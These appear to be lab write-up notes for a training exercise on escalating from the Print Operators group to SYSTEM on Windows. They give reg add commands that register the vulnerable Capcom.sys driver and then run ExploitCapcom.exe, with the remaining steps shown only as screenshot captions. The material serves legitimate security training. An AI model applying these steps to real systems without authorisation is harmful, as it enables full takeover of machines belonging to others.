# [Print Operators](Print%20Operators.md)
### Follow the steps in this section to escalate privileges to SYSTEM, and submit the contents of the flag.txt file on administrator's Desktop. Necessary tools for both methods can be found in the C:\Tools directory, or you can practice compiling and uploading them on your own.

Firstly, confirm the privilege
![](Screenshot%202026-08-19%20at%2014.13.26.png)

Add reference to driver
```cmd
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```
![](Screenshot%202026-08-19%20at%2014.19.23.png)

Verified driver is not loaded
![](Screenshot%202026-08-19%20at%2014.20.39.png)

Verified privilege is enabled
![](Screenshot%202026-08-19%20at%2014.40.08.png)

Verified Capcom driver is listed
![](Screenshot%202026-08-19%20at%2014.40.54.png)

Use ExploitCapcom Tool to Escalate Privileges

```powershell
.\ExploitCapcom.exe
```
![](Screenshot%202026-08-19%20at%2014.41.57.png)